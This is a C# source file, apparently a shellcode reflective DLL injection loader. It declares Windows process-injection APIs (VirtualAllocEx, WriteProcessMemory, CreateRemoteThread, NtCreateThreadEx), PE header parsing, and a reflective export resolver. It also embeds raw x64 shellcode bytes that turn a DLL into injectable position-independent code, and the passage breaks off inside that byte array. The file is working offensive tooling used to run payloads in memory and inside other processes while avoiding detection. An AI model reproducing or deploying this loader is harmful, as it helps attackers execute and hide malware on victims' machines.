using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;

namespace RDIShellcodeLoader
{
    static class Native
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("msvcrt.dll")]
        public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

        [DllImport("msvcrt.dll")]
        public static extern IntPtr memset(IntPtr dest, Int32 character, IntPtr count);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, String procName);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, UInt32 dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualFree(IntPtr lpAddress, UIntPtr dwSize, UInt32 dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern Boolean FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hModule, UInt32 timeout);

        [DllImport("kernel32.dll")]
        public static extern Boolean WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern Boolean ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, out IntPtr lpThreadID);

        [DllImport("kernel32.dll")]
        public static extern Boolean GetExitCodeThread(IntPtr hThread, Int32 exitCode);

        [DllImport("kernel32.dll")]
        public static extern Boolean OpenThreadToken(IntPtr ThreadHandle, UInt32 DesiredAccess, Boolean OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll")]
        public static extern Boolean CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 NtCreateThreadEx(out IntPtr hThread, UInt32 DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, Boolean CreateSuspended, UInt32 StackZeroBits, UInt32 SizeOfStackCommit, UInt32 SizeOfStackReserve, IntPtr lpBytesBuffer);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, out UInt32 lpThreadID);

        [DllImport("kernel32.dll")]
        public static extern Boolean AdjustTokenPrivileges(IntPtr TokenHandle, Boolean DisableAllPrivileges, IntPtr NewState, UInt32 BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("kernel32.dll")]
        public static extern Boolean IsWow64Process(Int32 hProcess);

        public const UInt64 MEM_COMMIT = 0x00001000;
        public const UInt64 MEM_RESERVE = 0x00002000;
        public const ushort PAGE_NOACCESS = 0x01;
        public const ushort PAGE_READONLY = 0x02;
        public const ushort PAGE_READWRITE = 0x04;
        public const ushort PAGE_WRITECOPY = 0x08;
        public const ushort PAGE_EXECUTE = 0x10;
        public const ushort PAGE_EXECUTE_READ = 0x20;
        public const ushort PAGE_EXECUTE_READWRITE = 0x40;
        public const ushort PAGE_EXECUTE_WRITECOPY = 0x80;
        public const UInt32 PAGE_NOCACHE = 0x200;
        public const UInt64 IMAGE_SCN_MEM_DISCARDABLE = 0x02000000;
        public const UInt64 IMAGE_SCN_MEM_EXECUTE = 0x20000000;
        public const UInt64 IMAGE_SCN_MEM_READ = 0x40000000;
        public const UInt64 IMAGE_SCN_MEM_WRITE = 0x80000000;
        public const UInt64 IMAGE_SCN_MEM_NOT_CACHED = 0x04000000;
        public const UInt32 MEM_DECOMMIT = 0x4000;
        public const UInt32 IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002;
        public const UInt32 IMAGE_FILE_DLL = 0x2000;
        public const ushort IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x40;
        public const UInt32 IMAGE_DLLCHARACTERISTICS_NX_COMPAT = 0x100;
        public const UInt32 MEM_RELEASE = 0x8000;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const ushort SE_PRIVILEGE_ENABLED = 0x2;
        public const UInt32 ERROR_NO_TOKEN = 0x3f0;
    }

    public class PE
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        //[StructLayout(LayoutKind.Sequential, Pack = 1)]
        [StructLayout(LayoutKind.Explicit)]
        unsafe struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            public fixed byte Name[8];
            [FieldOffset(8)]
            public uint PhysicalAddress;
            [FieldOffset(8)]
            public uint VirtualSize;
            [FieldOffset(12)]
            public uint VirtualAddress;
            [FieldOffset(16)]
            public uint SizeOfRawData;
            [FieldOffset(20)]
            public uint PointerToRawData;
            [FieldOffset(24)]
            public uint PointerToRelocations;
            [FieldOffset(28)]
            public uint PointerToLinenumbers;
            [FieldOffset(32)]
            public ushort NumberOfRelocations;
            [FieldOffset(34)]
            public ushort NumberOfLinenumbers;
            [FieldOffset(36)]
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_EXPORT_DIRECTORY
        {
            public uint Characteristics;
            public uint TimeDateStamp;
            public ushort MajorVersion;
            public ushort MinorVersion;
            public uint Name;
            public uint Base;
            public uint NumberOfFunctions;
            public uint NumberOfNames;
            public uint AddressOfFunctions;     // RVA from base of image
            public uint AddressOfNames;         // RVA from base of image
            public uint AddressOfNameOrdinals;  // RVA from base of image
        }

        enum IMAGE_DOS_SIGNATURE : ushort
        {
            DOS_SIGNATURE = 0x5A4D,      // MZ
            OS2_SIGNATURE = 0x454E,      // NE
            OS2_SIGNATURE_LE = 0x454C,      // LE
        }

        enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b,
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_DOS_HEADER
        {
            public IMAGE_DOS_SIGNATURE e_magic;        // Magic number
            public ushort e_cblp;                      // public bytes on last page of file
            public ushort e_cp;                        // Pages in file
            public ushort e_crlc;                      // Relocations
            public ushort e_cparhdr;                   // Size of header in paragraphs
            public ushort e_minalloc;                  // Minimum extra paragraphs needed
            public ushort e_maxalloc;                  // Maximum extra paragraphs needed
            public ushort e_ss;                        // Initial (relative) SS value
            public ushort e_sp;                        // Initial SP value
            public ushort e_csum;                      // Checksum
            public ushort e_ip;                        // Initial IP value
            public ushort e_cs;                        // Initial (relative) CS value
            public ushort e_lfarlc;                    // File address of relocation table
            public ushort e_ovno;                      // Overlay number
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
            public string e_res;                       // May contain 'Detours!'
            public ushort e_oemid;                     // OEM identifier (for e_oeminfo)
            public ushort e_oeminfo;                   // OEM information; e_oemid specific
            [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;                      // Reserved public ushorts
            public Int32 e_lfanew;                    // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_OPTIONAL_HEADER
        {
            //
            // Standard fields.
            //

            public MagicType Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public uint BaseOfData;
            public uint ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public uint SizeOfStackReserve;
            public uint SizeOfStackCommit;
            public uint SizeOfHeapReserve;
            public uint SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Public;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_OPTIONAL_HEADER64
        {
            public MagicType Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Public;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_NT_HEADERS
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER OptionalHeader;
        }

        public static unsafe class InteropTools
        {
            private static readonly Type SafeBufferType = typeof(SafeBuffer);
            public delegate void PtrToStructureNativeDelegate(byte* ptr, TypedReference structure, uint sizeofT);
            public delegate void StructureToPtrNativeDelegate(TypedReference structure, byte* ptr, uint sizeofT);
            const BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
            private static readonly MethodInfo PtrToStructureNativeMethod = SafeBufferType.GetMethod("PtrToStructureNative", flags);
            private static readonly MethodInfo StructureToPtrNativeMethod = SafeBufferType.GetMethod("StructureToPtrNative", flags);
            public static readonly PtrToStructureNativeDelegate PtrToStructureNative = (PtrToStructureNativeDelegate)Delegate.CreateDelegate(typeof(PtrToStructureNativeDelegate), PtrToStructureNativeMethod);
            public static readonly StructureToPtrNativeDelegate StructureToPtrNative = (StructureToPtrNativeDelegate)Delegate.CreateDelegate(typeof(StructureToPtrNativeDelegate), StructureToPtrNativeMethod);

            private static readonly Func<Type, bool, int> SizeOfHelper_f = (Func<Type, bool, int>)Delegate.CreateDelegate(typeof(Func<Type, bool, int>), typeof(Marshal).GetMethod("SizeOfHelper", flags));

            public static void StructureToPtrDirect(TypedReference structure, IntPtr ptr, int size)
            {
                StructureToPtrNative(structure, (byte*)ptr, unchecked((uint)size));
            }

            public static void StructureToPtrDirect(TypedReference structure, IntPtr ptr)
            {
                StructureToPtrDirect(structure, ptr, SizeOf(__reftype(structure)));
            }

            public static void PtrToStructureDirect(IntPtr ptr, TypedReference structure, int size)
            {
                PtrToStructureNative((byte*)ptr, structure, unchecked((uint)size));
            }

            public static void PtrToStructureDirect(IntPtr ptr, TypedReference structure)
            {
                PtrToStructureDirect(ptr, structure, SizeOf(__reftype(structure)));
            }

            public static void StructureToPtr<T>(ref T structure, IntPtr ptr)
            {
                StructureToPtrDirect(__makeref(structure), ptr);
            }

            public static void PtrToStructure<T>(IntPtr ptr, out T structure)
            {
                structure = default(T);
                PtrToStructureDirect(ptr, __makeref(structure));
            }

            public static T PtrToStructure<T>(IntPtr ptr)
            {
                T obj;
                PtrToStructure(ptr, out obj);
                return obj;
            }

            public static int SizeOf<T>(T structure)
            {
                return SizeOf<T>();
            }

            public static int SizeOf<T>()
            {
                return SizeOf(typeof(T));
            }

            public static int SizeOf(Type t)
            {
                return SizeOfHelper_f(t, true);
            }
        }

        public static IntPtr Rva2Offset(uint dwRva, IntPtr PEPointer)
        {
            bool is64Bit = false;
            ushort wIndex = 0;
            ushort wNumberOfSections = 0;
            IntPtr imageSectionPtr;
            IMAGE_SECTION_HEADER SectionHeader;
            int sizeOfSectionHeader = Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));

            IMAGE_DOS_HEADER dosHeader = InteropTools.PtrToStructure<IMAGE_DOS_HEADER>(PEPointer);

            IntPtr NtHeadersPtr = (IntPtr)((UInt64)PEPointer + (UInt64)dosHeader.e_lfanew);

            var imageNtHeaders32 = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));
            var imageNtHeaders64 = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));

            if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64Bit = true;


            if (is64Bit)
            {
                imageSectionPtr = (IntPtr)(((Int64)NtHeadersPtr + (Int64)Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS64), "OptionalHeader") + (Int64)imageNtHeaders64.FileHeader.SizeOfOptionalHeader));
                SectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(imageSectionPtr, typeof(IMAGE_SECTION_HEADER));
                wNumberOfSections = imageNtHeaders64.FileHeader.NumberOfSections;
            }
            else
            {
                imageSectionPtr = (IntPtr)(((Int64)NtHeadersPtr + (Int64)Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS), "OptionalHeader") + (Int64)imageNtHeaders32.FileHeader.SizeOfOptionalHeader));
                SectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(imageSectionPtr, typeof(IMAGE_SECTION_HEADER));
                wNumberOfSections = imageNtHeaders32.FileHeader.NumberOfSections;
            }

            if (dwRva < SectionHeader.PointerToRawData)
                return (IntPtr)((UInt64)dwRva + (UInt64)PEPointer);

            for (wIndex = 0; wIndex < wNumberOfSections; wIndex++)
            {
                SectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((IntPtr)((uint)imageSectionPtr + (uint)(sizeOfSectionHeader * (wIndex))), typeof(IMAGE_SECTION_HEADER));
                if (dwRva >= SectionHeader.VirtualAddress && dwRva < (SectionHeader.VirtualAddress + SectionHeader.SizeOfRawData))
                    return (IntPtr)((UInt64)(dwRva - SectionHeader.VirtualAddress + SectionHeader.PointerToRawData) + (UInt64)PEPointer);
            }

            return IntPtr.Zero;
        }

        public static unsafe bool Is64BitDLL(byte[] dllBytes)
        {
            bool is64Bit = false;
            GCHandle scHandle = GCHandle.Alloc(dllBytes, GCHandleType.Pinned);
            IntPtr scPointer = scHandle.AddrOfPinnedObject();

            IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(scPointer, typeof(IMAGE_DOS_HEADER));

            IntPtr NtHeadersPtr = (IntPtr)((UInt64)scPointer + (UInt64)dosHeader.e_lfanew);

            var imageNtHeaders64 = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));
            var imageNtHeaders32 = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));

            if (imageNtHeaders64.Signature != 0x00004550)
                throw new ApplicationException("Invalid IMAGE_NT_HEADER signature.");

            if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64Bit = true;

            scHandle.Free();

            return is64Bit;
        }

        public static unsafe IntPtr GetProcAddressR(IntPtr PEPointer, string functionName)
        {
            bool is64Bit = false;

            IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(PEPointer, typeof(IMAGE_DOS_HEADER));

            IntPtr NtHeadersPtr = (IntPtr)((UInt64)PEPointer + (UInt64)dosHeader.e_lfanew);

            var imageNtHeaders64 = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));
            var imageNtHeaders32 = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));

            if (imageNtHeaders64.Signature != 0x00004550)
                throw new ApplicationException("Invalid IMAGE_NT_HEADER signature.");

            if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64Bit = true;

            IntPtr ExportTablePtr;

            if (is64Bit)
            {
                if ((imageNtHeaders64.FileHeader.Characteristics & 0x2000) != 0x2000)
                    throw new ApplicationException("File is not a DLL, Exiting.");

                ExportTablePtr = (IntPtr)((UInt64)PEPointer + (UInt64)imageNtHeaders64.OptionalHeader.ExportTable.VirtualAddress);
            }
            else
            {
                if ((imageNtHeaders32.FileHeader.Characteristics & 0x2000) != 0x2000)
                    throw new ApplicationException("File is not a DLL, Exiting.");

                ExportTablePtr = (IntPtr)((UInt64)PEPointer + (UInt64)imageNtHeaders32.OptionalHeader.ExportTable.VirtualAddress);
            }

            IMAGE_EXPORT_DIRECTORY ExportTable = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(ExportTablePtr, typeof(IMAGE_EXPORT_DIRECTORY));

            for (int i = 0; i < ExportTable.NumberOfNames; i++)
            {
                IntPtr NameOffsetPtr = (IntPtr)((ulong)PEPointer + (ulong)ExportTable.AddressOfNames);
                NameOffsetPtr += (i * Marshal.SizeOf(typeof(UInt32)));
                IntPtr NamePtr = (IntPtr)((ulong)PEPointer + (uint)Marshal.PtrToStructure(NameOffsetPtr, typeof(uint)));

                string Name = Marshal.PtrToStringAnsi(NamePtr);

                if (Name.Contains(functionName))
                {
                    IntPtr AddressOfFunctions = (IntPtr)((ulong)PEPointer + (ulong)ExportTable.AddressOfFunctions);
                    IntPtr OrdinalRvaPtr = (IntPtr)((ulong)PEPointer + (ulong)(ExportTable.AddressOfNameOrdinals + (i * Marshal.SizeOf(typeof(UInt16)))));
                    UInt16 FuncIndex = (UInt16)Marshal.PtrToStructure(OrdinalRvaPtr, typeof(UInt16));
                    IntPtr FuncOffsetLocation = (IntPtr)((ulong)AddressOfFunctions + (ulong)(FuncIndex * Marshal.SizeOf(typeof(UInt32))));
                    IntPtr FuncLocationInMemory = (IntPtr)((ulong)PEPointer + (uint)Marshal.PtrToStructure(FuncOffsetLocation, typeof(UInt32)));

                    return FuncLocationInMemory;
                }
            }
            return IntPtr.Zero;
        }
    }

    class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr ReflectiveLoader();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate bool ExportedFunction(IntPtr userData, uint userLength);

        public static byte[] ConvertToShellcode(byte[] dllBytes, uint functionHash, byte[] userData)
        {
#if DEBUG
            byte[] rdiShellcode64 = System.IO.File.ReadAllBytes("./ShellcodeRDI_x64.bin");
            byte[] rdiShellcode32 = System.IO.File.ReadAllBytes("./ShellcodeRDI_x86.bin");
#else
            var rdiShellcode64 = new byte[] { 0xe9, 0x1b, 0x04, 0x00, 0x00, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x10, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x8b, 0xf1, 0x33, 0xed, 0x48, 0x8b, 0x50, 0x18, 0x4c, 0x8b, 0x4a, 0x10, 0x4d, 0x8b, 0x41, 0x30, 0x4d, 0x85, 0xc0, 0x0f, 0x84, 0xb9, 0x00, 0x00, 0x00, 0x41, 0x0f, 0x10, 0x41, 0x58, 0x49, 0x63, 0x40, 0x3c, 0x4d, 0x8b, 0x09, 0x46, 0x8b, 0x9c, 0x00, 0x88, 0x00, 0x00, 0x00, 0x8b, 0xd5, 0xf3, 0x0f, 0x7f, 0x04, 0x24, 0x45, 0x85, 0xdb, 0x74, 0xd3, 0x48, 0x8b, 0x04, 0x24, 0x48, 0xc1, 0xe8, 0x10, 0x66, 0x3b, 0xe8, 0x73, 0x26, 0x48, 0x8b, 0x4c, 0x24, 0x08, 0x44, 0x0f, 0xb7, 0x54, 0x24, 0x02, 0x0f, 0xbe, 0x01, 0xc1, 0xca, 0x0d, 0x80, 0x39, 0x61, 0x7c, 0x06, 0x8d, 0x54, 0x02, 0xe0, 0xeb, 0x02, 0x03, 0xd0, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xca, 0x75, 0xe5, 0x4f, 0x8d, 0x14, 0x18, 0x8b, 0xcd, 0x45, 0x8b, 0x5a, 0x20, 0x4d, 0x03, 0xd8, 0x41, 0x39, 0x6a, 0x18, 0x76, 0x8d, 0x41, 0x8b, 0x1b, 0x8b, 0xfd, 0x49, 0x03, 0xd8, 0x49, 0x83, 0xc3, 0x04, 0x0f, 0xbe, 0x03, 0xc1, 0xcf, 0x0d, 0x48, 0xff, 0xc3, 0x03, 0xf8, 0x40, 0x38, 0x6b, 0xff, 0x75, 0xef, 0x8d, 0x04, 0x17, 0x3b, 0xc6, 0x74, 0x0d, 0xff, 0xc1, 0x41, 0x3b, 0x4a, 0x18, 0x72, 0xd4, 0xe9, 0x5c, 0xff, 0xff, 0xff, 0x41, 0x8b, 0x52, 0x24, 0x03, 0xc9, 0x49, 0x8d, 0x04, 0x10, 0x0f, 0xb7, 0x04, 0x01, 0x41, 0x8b, 0x4a, 0x1c, 0xc1, 0xe0, 0x02, 0x48, 0x98, 0x49, 0x03, 0xc0, 0x8b, 0x04, 0x01, 0x49, 0x03, 0xc0, 0xeb, 0x02, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x20, 0x48, 0x8b, 0x6c, 0x24, 0x28, 0x48, 0x8b, 0x74, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x10, 0x5f, 0xc3, 0xcc, 0xcc, 0x44, 0x89, 0x4c, 0x24, 0x20, 0x4c, 0x89, 0x44, 0x24, 0x18, 0x89, 0x54, 0x24, 0x10, 0x53, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xf1, 0xb9, 0x4c, 0x77, 0x26, 0x07, 0x44, 0x8b, 0xe2, 0xe8, 0xca, 0xfe, 0xff, 0xff, 0xb9, 0x49, 0xf7, 0x02, 0x78, 0x4c, 0x8b, 0xf0, 0xe8, 0xbd, 0xfe, 0xff, 0xff, 0xb9, 0x58, 0xa4, 0x53, 0xe5, 0x4c, 0x8b, 0xf8, 0xe8, 0xb0, 0xfe, 0xff, 0xff, 0xb9, 0xaf, 0xb1, 0x5c, 0x94, 0x48, 0x8b, 0xd8, 0xe8, 0xa3, 0xfe, 0xff, 0xff, 0x48, 0x63, 0x6e, 0x3c, 0x33, 0xc9, 0x48, 0x03, 0xee, 0x41, 0xb8, 0x00, 0x30, 0x00, 0x00, 0x8b, 0x55, 0x50, 0x44, 0x8d, 0x49, 0x40, 0x4c, 0x8b, 0xe8, 0x48, 0x89, 0x44, 0x24, 0x70, 0xff, 0xd3, 0x44, 0x8b, 0x45, 0x54, 0x48, 0x8b, 0xf8, 0x48, 0x8b, 0xd6, 0x41, 0xbb, 0x01, 0x00, 0x00, 0x00, 0x4d, 0x85, 0xc0, 0x74, 0x13, 0x48, 0x8b, 0xc8, 0x48, 0x2b, 0xce, 0x8a, 0x02, 0x88, 0x04, 0x11, 0x49, 0x03, 0xd3, 0x4d, 0x2b, 0xc3, 0x75, 0xf3, 0x44, 0x0f, 0xb7, 0x4d, 0x06, 0x0f, 0xb7, 0x45, 0x14, 0x4d, 0x85, 0xc9, 0x74, 0x36, 0x48, 0x8d, 0x4c, 0x28, 0x2c, 0x8b, 0x51, 0xf8, 0x44, 0x8b, 0x01, 0x44, 0x8b, 0x51, 0xfc, 0x48, 0x03, 0xd7, 0x4c, 0x03, 0xc6, 0x4d, 0x2b, 0xcb, 0x4d, 0x85, 0xd2, 0x74, 0x10, 0x41, 0x8a, 0x00, 0x4d, 0x03, 0xc3, 0x88, 0x02, 0x49, 0x03, 0xd3, 0x4d, 0x2b, 0xd3, 0x75, 0xf0, 0x48, 0x83, 0xc1, 0x28, 0x4d, 0x85, 0xc9, 0x75, 0xcf, 0x8b, 0x9d, 0x90, 0x00, 0x00, 0x00, 0x48, 0x03, 0xdf, 0x8b, 0x43, 0x0c, 0x85, 0xc0, 0x0f, 0x84, 0x93, 0x00, 0x00, 0x00, 0x8b, 0xc8, 0x48, 0x03, 0xcf, 0x41, 0xff, 0xd6, 0x44, 0x8b, 0x23, 0x8b, 0x73, 0x10, 0x4c, 0x03, 0xe7, 0x4c, 0x8b, 0xe8, 0x48, 0x03, 0xf7, 0xeb, 0x5b, 0x49, 0x83, 0x3c, 0x24, 0x00, 0x74, 0x3b, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x49, 0x85, 0x04, 0x24, 0x74, 0x2b, 0x49, 0x63, 0x45, 0x3c, 0x41, 0x0f, 0xb7, 0x14, 0x24, 0x42, 0x8b, 0x8c, 0x28, 0x88, 0x00, 0x00, 0x00, 0x42, 0x8b, 0x44, 0x29, 0x10, 0x48, 0x2b, 0xd0, 0x42, 0x8b, 0x44, 0x29, 0x1c, 0x49, 0x8d, 0x4c, 0x05, 0x00, 0x8b, 0x04, 0x91, 0x49, 0x03, 0xc5, 0xeb, 0x0e, 0x48, 0x8b, 0x06, 0x49, 0x8b, 0xcd, 0x48, 0x8d, 0x54, 0x07, 0x02, 0x41, 0xff, 0xd7, 0x48, 0x89, 0x06, 0x48, 0x83, 0xc6, 0x08, 0x49, 0x83, 0xc4, 0x08, 0x48, 0x83, 0x3e, 0x00, 0x75, 0x9f, 0x8b, 0x43, 0x20, 0x48, 0x83, 0xc3, 0x14, 0x85, 0xc0, 0x0f, 0x85, 0x77, 0xff, 0xff, 0xff, 0x44, 0x8b, 0x64, 0x24, 0x78, 0x4c, 0x8b, 0x6c, 0x24, 0x70, 0x4c, 0x8b, 0xcf, 0x41, 